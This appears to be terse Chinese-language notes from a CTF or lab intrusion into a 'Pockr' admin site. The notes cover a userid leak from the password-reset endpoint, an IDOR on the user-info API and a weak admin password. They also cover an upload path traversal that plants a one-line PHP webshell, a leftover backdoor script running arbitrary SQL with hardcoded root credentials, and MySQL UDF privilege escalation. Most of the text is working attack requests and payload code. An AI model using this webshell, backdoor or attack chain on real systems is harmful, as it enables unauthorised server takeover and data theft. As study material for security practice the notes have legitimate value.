POST /Admin_Pockr_login/forgorpwd_action
email=admin@pockr.com
get {"message":"true","email":"admin@pockr.com","userid":"BB568A04-8159-964E-CE49-D68AC10F8101"}
/assets/js/api.js
```js
define(function (require, exports, module) {
    var $ = require('jquery');
    var url='User_Pockr_Api/UserInfo';
    var userid=$("#userid").val();
    $.post(url, { userid: userid }, function (resultJSONObject) {
        if (resultJSONObject.message) {
            $("$userinfo").append(resultJSONObject.username);
        } else {
            alert("error");
        }
    }, "json");
})
```
POST /User_Pockr_Api/UserInfo
userid=BB568A04-8159-964E-CE49-D68AC10F8101
get {"message":"true","email":"admin@pockr.com","username":"sunzheyi"}
弱口令 密码:1q2w3e
/Admin_Pockr_home/add_menu_action 文件上传
设置 subSysFolder ../../.
webshell
```php
<?php
@system($_POST['cmd']);
?>
```
服务器没有安装mysql 找到了别人留下来的后门 82f616c83ca2df8a7b2edb27a5bac153.php
```php
<?php
        $mysql_server_name='sql05.ciadmin.com';
        $mysql_username='root';
        $mysql_password='mysql_2018';
        $mysql_database='five_admindb';
        $mysqli = mysqli_connect($mysql_server_name,$mysql_username,$mysql_password,$mysql_database);
        if (mysqli_connect_error()) {
                die('Connect Database Error');
        }
        $sql = $_GET['sql'];
        $q = mysqli_query($mysqli,$sql);
        var_dump($q->fetch_array());
        mysqli_close($mysqli);
?>
```
数据库里没东西 mysql版本5.7.21 用户root@172.18.0.2
最终要求获得mysql数据库服务器的权限 尝试udf提权
系统环境 Linux x86_64 plugin文件夹路径 /usr/lib/mysql/plugin/
偷鸡成功 原来加载的函数没有被drop




